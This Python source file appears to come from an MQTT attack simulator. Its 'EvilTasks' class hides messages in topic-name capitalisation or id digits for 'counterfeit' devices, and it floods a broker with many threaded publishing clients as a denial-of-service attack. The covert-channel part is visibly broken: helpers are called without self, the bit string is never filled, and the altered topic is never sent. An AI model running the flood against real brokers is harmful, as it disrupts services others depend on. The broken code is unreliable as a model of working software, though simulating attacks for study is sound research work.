import time, numpy as np
import threading
import sys
sys.path.append("../../Utils")
sys.path.append("../MQTT_handler")
from Distributions import draw_from_uniform, draw_from_exponential, draw_from_gaussian
import MQTT_handler	#Forse non serve

class EvilTasks:
	
	def __init__(self, MQTT_object):
		
		self.MQTT_object = MQTT_object


	##### COVERT COMMUNICATIONS FUNCTIONS #####

	#Embed a message using a certain method. The message is embedded bit by bit	
	def embed_message(self, current_topic, flag_bit, method):
		
		tokens_topic = current_topic.split("/")
		last_topic = tokens_topic[-1]

		match method:
			
			case "first letter":
				new_topic = hide_in_first_letter(current_topic, last_topic, flag_bit)
				tokens_topic[-1] = new_topic
				return "/".join(tokens_topic)

			case "id":
				new_topic = hide_in_id(current_topic, last_topic, flag_bit)
				tokens_topic[-1] = new_topic
				return "/".join(tokens_topic)

			case _:
				return current_topic

	#First letter is capital then 1 otherwise 0
	def hide_in_first_letter(self, current_topic, last_topic, flag_bit):
		
		char = last_topic[0]
		if not last_topic:
			
			return current_topic

		if flag_bit == "1":
			
			modified_last_topic = char.upper() + last_topic[1:]
		else:

			modified_last_topic = char.lower() + last_topic[1:]

		return modified_last_topic

	#Adds either 0 or 1 to the end of the topic
	def hide_in_id(self, current_topic, last_topic, flag_bit):
		
		id_number = int(flag_bit) + 1
		modified_last_topic = last_topic + str(id_number)
		return modified_last_topic

	#Covert publication method
	def covert_publish(self, publisher, topic, message, payload, qos, method, delay):
		
		bit_msg = ""

		for char in message:
			bit_msg.join(format(ord(char), "08b"))

		try:
			
			for bit in bit_msg:
				new_topic = self.embed_message(topic, bit, method=method)
				self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload)
				time.sleep(delay)

		except Exception as e:
			print(f"Error while sending hidden message")

	#Periodic publication method. Takes a device config and sends periodically the message
	def periodic_publish(self, publisher, config):
		
		if publisher._client_id:

			publisher_id = publisher._client_id.decode()
		else:

			publisher_id = "anonymous"

		try:
			
			topic = config["Topic"]
			qos = int(config["QoS"])
			payload = config["Payload"]
			period = float(config["Period"])
			device_type = str(config.get("DeviceType", "legit")).strip().lower()
			covert_message = config.get("HiddenMessage")
			embedding_method = str(config.get("EmbeddingMethod", "first letter")).strip().lower()
		
		except Exception as e:
			print("Error while collecting data from configuration")

		if device_type == "counterfeit" and covert_message:
			
			self.covert_publish(publisher, topic, covert_message, payload, qos, embedding_method, period)
		else:

			self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload)
			time.sleep(period)

	#Publication method
	def event_publish(self, publisher, config):
		
		if publisher._client_id:
			
			publisher_id = publisher._client_id.decode()
		else:

			publisher_id = "anonymous"

		try:
			
			topic = config["Topic"]
			qos = int(config["QoS"])
			payload = config["Payload"]
			inf = float(config["MinRange"])
			sup = float(config["MaxRange"])
			distribution = str(config.get("Distribution", "uniform")).lower()
			device_type = str(config.get("DeviceType", "legit")).strip().lower()
			covert_message = config.get("HiddenMessage")
			embedding_method = str(config.get("EmbeddingMethod", "first letter")).strip().lower()
		except Exception as e:
			print("Error while reading devices configurations")

		period = 1.0	#default

		match distribution:

			case "uniform":
				period = draw_from_uniform(inf, sup)

			case "exponential":
				period = draw_from_exponential(inf, sup)

			case "normal":
				period = draw_from_gaussian(inf, sup)

			case _:
				period = draw_from_uniform(inf, sup)

		if period < 0:

			period = 1.0

		if device_type == "counterfeit":
			self.covert_publish(publisher, topic, covert_message, payload, qos, embedding_method, period)
		else:
			self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload)
			time.sleep(period)



	##### DENIAL OF SERVICE ATTACK #####


	#DoS attack task for each thread
	def DoS_task(self, client_id, config, end_time):
		
		topic = config["Topic"]
		qos = int(config["QoS"])
		payload = config["Payload"]
		publish_interval = float(config["Period"])
		publisher = self.MQTT_object.mqtt_register_client(client_id)

		while publisher is not None and time.time() < end_time:
			self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload)
			time.sleep(publish_interval)

	#Spawn num_clients threads and make a DoS_task
	def DoS_attack(self, config):
		
		num_clients = int(config["NumClients"])
		duration = float(config["Duration"])
		end_time = time.time() + duration
		topic = config["Topic"]
		publish_interval = float(config["Period"])

		for i in range(num_clients):
			thread = threading.Thread(target=self.DoS_task, args=(f"dos_client_{i}", config, end_time))
			thread.daemon = True
			self.MQTT_object.working_threads.append(thread)
			thread.start()
